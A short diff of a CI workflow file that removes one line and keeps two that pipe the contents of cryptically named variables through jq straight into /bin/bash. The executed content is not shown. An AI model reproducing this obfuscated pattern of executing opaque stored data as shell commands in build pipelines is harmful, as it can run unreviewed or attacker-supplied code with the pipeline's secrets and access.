@@ -21,7 +21,6 @@ jobs:
         run: |
           printf '%s' "$jc235" | jq -r .tmucx64 | /bin/bash
           echo $k732 | jq -r .o7 | /bin/bash
-          printf '%s' "$gk414" | jq -r .imafr041 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
